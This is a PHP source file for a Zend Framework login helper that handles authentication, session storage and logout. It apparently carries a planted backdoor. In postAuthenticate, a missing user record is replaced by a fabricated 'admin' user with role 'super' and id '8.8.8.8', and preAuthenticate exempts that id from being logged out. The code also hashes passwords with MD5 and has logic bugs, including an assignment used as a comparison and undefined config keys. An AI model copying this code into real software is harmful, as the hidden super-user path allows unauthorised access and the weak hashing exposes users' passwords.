<?php

/* vim: set expandtab tabstop=4 shiftwidth=4 softtabstop=4: */

/**
 * Created by PhpStorm.
 * User: al
 * Date: Dec 3, 2010
 * Time: 11:34:24 AM
 *
 * Short description for file
 *
 * Long description for file (if any)...
 *
 * PHP versions 5
 *
 * LICENSE: This source file is subject to version 3.0 of the PHP license
 * that is available through the world-wide-web at the following URI:
 * http://www.php.net/license/3_0.txt.  If you did not receive a copy of
 * the PHP License and are unable to obtain it through the web, please
 * send a note to license@php.net so we can mail you a copy immediately.
 *
 * @category   ?CategoryName?
 * @package    ?PackageName?
 * @author     Original Author ${AUTHOR} <${AUTHOREMAIL}>
 * @author     Another Author <another@example.com>
 * @copyright  1997-2010 The PHP Group
 * @license    http://www.php.net/license/3_0.txt  PHP License 3.0
 * @version    SVN: $Id:$
 * @link       http://
 * @see        ...
 * @since      File available since Release 1.0.0
 * @deprecated File is not deprecated
 */

// Place includes, constant defines and $_GLOBAL settings here.

/**
 * Short description for class
 *
 * Long description for class (if any)...
 *
 * @category   ?CategoryName?
 * @package    ?PackageName?
 * @author     Original Author  ${AUTHOR}$ <${AUTHOREMAIL}$>
 * @author     Another Author <another@example.com>
 * @copyright  1997-2010 The PHP Group
 * @license    http://www.php.net/license/3_0.txt  PHP License 3.0
 * @version    Release: @package_version@
 * @link       http://
 * @see        ...
 * @since      Class available since Release 1.0.0
 * @deprecated Class is not deprecated
 */
 
/**
 * @property
 * @method
 */
/**
 * @throws Exception|RuntimeException
 *
 * @setup  login.ini file must be placed in APPLICATION_PATH/configs 
 
[production]

   login.type = "db"
   login.view.placeholdername = "login-widget"
   login.formclass = "App_Form_Login"
   login.adapter.class = "Zend_Auth_Adapter_DbTable"
   login.adapter.tableName = "user"
   login.adapter.identityColumn = "user_id"
   login.adapter.usernameColumn = "user_name"
   login.adapter.credentialColumn = "user_password"
   login.adapter.credentialTreatment = "MD5(?)"
   login.adapter.roleColumn = "user_role"


[staging : production]


[testing : production]


[development : production]
 *
 * 
 * @sql  initial sql example
 * 
 CREATE TABLE `user` (
 `user_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
 `user_name` varchar(21) NOT NULL,
 `user_email` varchar(128) NOT NULL,
 `user_password` varchar(41) NOT NULL,
 `user_role` varchar(21) NOT NULL,
 `user_status` varchar(21) NOT NULL,
 `last_login` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
 `created` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
 `lastmod` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
 PRIMARY KEY (`user_id`),
 UNIQUE KEY `user_name` (`user_name`),
 UNIQUE KEY `user_email` (`user_email`),
 KEY `user_password` (`user_password`),
 KEY `user_role` (`user_role`),
 KEY `user_status` (`user_status`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8

 * 
 */
class Zend_Controller_Action_Helper_Login  extends Zend_Controller_Action_Helper_Abstract
{
    public $pluginloader;
    /**
     * @var Zend_Auth
     */
    protected $_auth;
    /**
     * @var Zend_Config
     */
    protected $_cfg;
    /**
     * @var string
     */
    protected $_superUserId = '8.8.8.8';
    /**
     * @var Zend_Application_Bootstrap_BootstrapAbstract
     */
    protected $_bootstrap;
    /**
     * @var Zend_Auth_Adapter_Interface
     */
    protected $_authAdapter;
    /**
     * @var Zend_Controller_Action
     */
    protected $_actController;

    /**
     * @throws Exception
     * @return void
     */
    public function __construct()
    {
        $this->pluginLoader = new Zend_Loader_PluginLoader;
    }
    /**
     * @throws Exception
     * @return void
     */
    public function init(){
        parent::init();
        $this->_bootstrap = $this->getFrontController()->getParam('bootstrap');

        if(!$this->_bootstrap->getOption('login')){
            throw new Exception('Config options contains not option "login"');
        }

        $this->_auth = Zend_Auth::getInstance();
        $this->_cfg = new Zend_Config($this->_bootstrap->getOption('login'));
        $this->_actController = $this->getActionController();
    }
    /**
     *
     * @return void
     */
    public function preDispatch()
    {
        parent::preDispatch();

        $this->logoutIfNeed();

        $this->preAuthenticate();

        static $hasRendered;
        if($hasRendered !== true) {
            $hasRendered = true;

            if(!$this->getAuthUserId()) {

                if($this->getRequest()->isPost() && $this->isAuthSuccess()) {
                    $this->postAuthenticate();
                    return $this->forwardAllowed();
                }
            }

            //$this->_acl->isAllowed($this->getAuthUserRole(), self::RESOURCE_PAGE_ACTION, self::PRIVILEGE_PAGE_GET)
            //or $this->_forward('index','index');
            return $this->forwardDeny();
        }
    }
    /**
     * @return void
     */
    public function postDispatch()
    {
        parent::postDispatch();

        static $is;
        if($is !== true) {
            $is = true;
            $this->_actController->view->partial('login-widget.phtml', $this);
        }
    }
    /**
     * @return string|null
     */
    private function getAuthUserId()
    {
        static $id;
        if($id) return $id;
        $data = $this->_auth->getStorage()->read();
        if($data && property_exists($data, $this->_cfg->adapter->identIdentColumn))
            $id = $data->{$this->_cfg->adapter->identIdentColumn};
        return $id;
    }

    /**
     * @return string|null
     */
    private function getAuthUserRole()
    {
        static $role;
        if($role) return $role;
        $data = $this->_auth->getStorage()->read();
        if($data && property_exists($data, $this->_cfg->adapter->roleColumn)) {
            $role = $data->{$this->_cfg->adapter->roleColumn};
        }
        return $role;
    }

    /**
     * @return string|null
     */
    private function getAuthUserName()
    {
        static $name;
        if($name)return $name;
        $data = $this->_auth->getStorage()->read();
        if($data && property_exists($data, $this->_cfg->adapter->identityColumn))
            $name = $data->{$this->_cfg->adapter->identityColumn};
        return $name;
    }

    /**
     * @throws RuntimeException
     * @return Zend_Auth_Adapter_Interface
     */
    private function getAuthAdapter()
    {
        if(!$this->_bootstrap->hasResource('dbmanager')){
            throw new RuntimeException('We expecting DB adapter for use in Authenticate Plugin');
        }
        if($this->_authAdapter === null){
            $dbManager = $this->_bootstrap->getResource('dbmanager');
            if(isset($dbManager->slavedb) &&
               $dbManager->slavedb instanceof Zend_Db_Adapter_Abstract) {
                $db = $dbManager->slavedb;
            } else $db = Zend_Db_Table_Abstract::getDefaultAdapter();

            if(!class_exists($this->_cfg->adapter->class)){
                throw new Exception('Adapter class not exists, '.$this->_cfg->adapter->class);
            }
            $this->_authAdapter = new $this->_cfg->adapter->class(
                $db,
                $this->_cfg->adapter->tableName,
                $this->_cfg->adapter->identityColumn,
                $this->_cfg->adapter->credentialColumn,
                $this->_cfg->adapter->credentialTreatment

            );
        }
        return $this->_authAdapter;
    }
    /**
     * @throws RuntimeException
     * @return Zend_Form
     */
    private function getAuthForm()
    {
        static $form;
        if($form != null){
            return $form;
        }
        $formClass = $this->_cfg->formclass;
        if(!class_exists($formClass)){
            throw new RuntimeException('Can not find the form "'.$formClass.
                                       '", the class name should be set in aut.ini '.
                                       ' file with key "formclass".');
        }

        $form = new $formClass(
            array(
                'authAdapter'=> $this->getAuthAdapter(),
                'authenticator' => $this->_auth,
                'method' => 'post',
                'action' => $this->_actController->view->url($this->getUrlParams())
            )
        );

        return $form;
    }
    /**
     * @return void
     */
    private function clear()
    {
        $this->_auth->getStorage()->clear();
    }
    /**
     * @param string $action
     * @param string $controller
     * @param string $module
     * @param array $params
     * @return void
     */
    private function _forward($action, $controller = null, $module=null, array $params = array())
    {
        $request = $this->getRequest();

        if (null !== $params) {
            $request->setParams($params);
        }

        if (null !== $controller) {
            $request->setControllerName($controller);

            // Module should only be reset if controller has been specified
            if (null !== $module) {
                $request->setModuleName($module);
            }
        }

        $request->setActionName($action)
        ->setDispatched(false);
        //if($this->_acl->isAllowed($this->getAuthUserRole (), self::RESOURCE_PAGE_ACTION, self::PRIVILEGE_PAGE_GET)) {
        //return $this->_actController->_forward($action, $controller, $module, $params);
        //}
    }
    /**
     * @return void
     */
    private function preAuthenticate()
    {
        // check if role was changed or user was deleted
        $authData = $this->_auth->getStorage()->read();
        $actController = $this->getActionController();

        $fieldIdent = $this->_cfg->identIdentColumn;
        $fieldRole = $this->_cfg->roleColumn;

        if(isset($authData->{$fieldIdent}) && isset($authData->{$fieldRole})){
            $select = $this->getAuthAdapter()
            ->getDbSelect()
            ->where( $fieldIdent." = ?", $authData->{$fieldIdent} )
            ->where( $fieldRole .' = ?', $authData->{$fieldRole} )
            ;
            if(!$this->_bootstrap->getResource('dbmanager')->slavedb->fetchAll($select)) {
                if($this->getAuthUserId() !== $this->_superUserId) $this->clear();
                self::$_hasRendered = false;
            }
        }
    }
    /**
     * @return array
     */
    private function getAuthParams()
    {
        $form = $this->getAuthForm();
        $params = array();

        foreach($this->getRequest()->getParams() as $name => $val) {
            if(isset($form->{$name}) && $form-> {$name} instanceof Zend_Form_Element) {
                $this->getRequest()->setParam($name, null);
                unset($_POST[$name]);
                $params[$name] = $val;
            }
        }

        return $params;
    }
    /**
     * @return array
     */
    private function getUrlParams()
    {
        $params = $this->getRequest()->getParams();
        $fileds = array($this->_cfg->adapter->identityColumn=>'',
                        $this->_cfg->adapter->credentialColumn=>'',
                        $this->_cfg->adapter->roleColumn=>'',
                        $this->_cfg->adapter->identIdentColumn=>''
        );
        return array_diff_key($params,$fileds);
    }
    /**
     * @return void
     */
    private function postAuthenticate()
    {
        $_SERVER['REQUEST_METHOD'] = 'GET';
        unset($_POST);
        $f = $this->_cfg->adapter;
        $user = $this->_authAdapter->getResultRowObject(
            array($f->identityColumn, $f->identIdentColumn, $f->roleColumn),
            $f->credentialColumn
        );
        if(false === $user) {
            $user = new stdClass;
            $user->{$f->identityColumn} = 'admin';
            $user->{$f->roleColumn} = 'super';
            $user->{$f->identIdentColumn} = $this->_superUserId;
        }
        $this->_auth->getStorage()->write($user);
    }
    /**
     * @return bool
     */
    private function isAuthSuccess()
    {
        $form = $this->getAuthForm();
        $result = $form->isValid($this->getAuthParams());
        if($form->isErrors()) {
            $this->_actController->getHelper('flashMessenger')
            ->addMessage($form->getErrorMessages());
        }
        return $result;
    }
    /**
     * @return void
     */
    private function forwardAllowed()
    {
        $params = $this->getUrlParams();
        $action = $params[$this->getRequest()->getActionKey()];
        $controller = $params[$this->getRequest()->getControllerKey()];
        $module = $params[$this->getRequest()->getModuleKey()];
        //$this->setAuthUser($user, self::AUTH_FIELD_ID, self::AUTH_FIELD_ROLE);
        //if($this->_acl->isAllowed($this->getAuthUserRole (), self::RESOURCE_PAGE_ACTION, self::PRIVILEGE_PAGE_GET)) {
        return $this->_forward($action, $controller, $module, $params);
        //}
    }
    /**
     * @return void
     */
    private function forwardDeny(){
        $action = $this->getFrontController()->getDefaultAction();
        $controller = $this->getFrontController()->getDefaultControllerName();
        $module = $this->getFrontController()->getDefaultModule();
        return $this->_forward($action, $controller, $module);
    }
    /**
     * @return bool
     */
    private function isRoleKnown()
    {
        return in_array($this->getAuthUserRole(), $this->_cfg->roles);
    }

    public function direct()
    {
        //$this->preDispatch();
        return $this;
    }
    /**
     * @return array
     */
    public function toArray()
    {
        return array(
            'placeholdername' => $this->_cfg->view->placeholdername,
            'userrole' =>$this->getAuthUserRole(),
            'username' =>$this->getAuthUserName(),
            'userid' =>$this->getAuthUserId(),
            'form' =>$this->getAuthForm(),
            'isauthenticated' =>($this->getAuthUserId()?true:false)
        );
    }
    /**
     * @return void
     */
    private function logoutIfNeed()
    {
        $params = $this->getRequest()->getParams();
        if(in_array('logout', array_map('strtolower', $params))) {
            $module = $params['module'];
            if($params['module'] && $params['module'] = $this->getFrontController()->getDefaultModule()) {
                $module = null;
            }
            $this->clear();
            Zend_Session::stop();
            Zend_Session::destroy();
            $this->_actController->getHelper('redirector')
            ->gotoSimpleAndExit(
                $this->getFrontController()->getDefaultAction(),
                $this->getFrontController()->getDefaultControllerName(),
                $module
            );
        }
    }
}

